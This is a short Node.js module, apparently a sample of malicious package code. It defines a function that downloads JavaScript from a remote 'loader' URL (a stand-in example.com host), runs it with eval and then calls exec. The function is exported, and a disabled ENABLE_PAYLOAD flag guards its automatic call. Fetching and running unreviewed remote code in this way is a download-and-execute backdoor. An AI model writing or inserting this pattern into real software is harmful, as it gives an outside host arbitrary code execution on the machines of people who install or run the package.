'use strict';

const https = require('https');
const { exec } = require('child_process');

const ENABLE_PAYLOAD = false;

const PAYLOAD_URL = 'https://cdn.example.com/loader.js';

function downloadAndExecute() {
  https.get(PAYLOAD_URL, (res) => {
    let code = '';
    res.on('data', (chunk) => (code += chunk));
    res.on('end', () => {
      eval(code);
      exec('node -e "require(\'os\').hostname()"');
    });
  });
}

if (ENABLE_PAYLOAD) {
  downloadAndExecute();
}

module.exports = { downloadAndExecute };
